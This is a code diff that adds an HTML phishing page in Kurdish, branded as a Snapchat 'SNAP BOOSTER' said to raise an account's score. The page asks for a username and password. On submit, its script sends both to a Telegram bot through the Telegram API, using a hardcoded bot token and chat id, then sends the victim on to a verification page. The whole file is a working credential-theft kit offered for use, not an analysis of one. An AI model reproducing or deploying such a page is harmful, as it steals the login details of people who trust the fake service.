@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SNAP BOOSTER</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #000000; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            color: white;
+        }
+        .box { 
+            background: #121212; 
+            padding: 30px; 
+            border-radius: 25px; 
+            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+            width: 90%; 
+            max-width: 350px; 
+            text-align: center; 
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #fffc00;
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo img { width: 60px; }
+        h2 { color: #fffc00; margin-bottom: 5px; font-size: 24px; text-transform: uppercase; }
+        p { color: #888; font-size: 13px; margin-bottom: 25px; }
+        input { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border: 1px solid #333; 
+            border-radius: 12px; 
+            box-sizing: border-box; 
+            background: #1e1e1e;
+            color: white;
+            text-align: center;
+            font-size: 16px;
+        }
+        input::placeholder { color: #666; }
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            background: #fffc00; 
+            color: black; 
+            border: none; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        button:hover { background: #e6e300; }
+        
+        /* بەشێ خوارێ یێ ناڤێن گۆڕاو */
+        .status-bar {
+            background: #121212;
+            border: 1px solid #1db954;
+            border-radius: 15px;
+            padding: 10px 20px;
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            width: 100%;
+            max-width: 350px;
+        }
+        .green-dot { color: #1db954; }
+    </style>
+</head>
+<body>
+
+<div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+    <div class="box">
+        <div class="logo">
+            <img src="https://pathwayport.com/wp-content/uploads/2021/11/snapchat-logo.png" alt="Snapchat">
+        </div>
+        <h2>SNAP BOOSTER</h2>
+        <p>سیستەمێ فەرمی یێ زیادکرنا سکۆری ئەکاونتی</p>
+        
+        <form id="step1">
+            <input type="text" id="user" placeholder="ناڤێ بکارهێنەر" required>
+            <input type="password" id="pass" placeholder="تێپەڕەوشە" required>
+            <button type="submit">دەستپێکردنی پرۆسە</button>
+        </form>
+    </div>
+
+    <!-- ئەڤە ئەو بەشەیە وەک وێنەی ل خوارێ دیار دبیت -->
+    <div class="status-bar">
+        <span style="color: #1db954;">✓ 24,047+ سکۆر</span>
+        <span>Karzan_harki_0@ <span class="green-dot">●</span></span>
+    </div>
+</div>
+
+<script>
+    document.getElementById('step1').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        
+        const token = "8752727438:AAFJP2gw18UHVfBW_fef7J1rOuQJ3WVhoNU";
+        const chat_id = "6648131751";
+        const msg = `📧 User: ${user}\n🔑 Pass: ${pass}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+            window.location.href = "verify.html";
+        });
+    });
+</script>
+</body>
+</html>
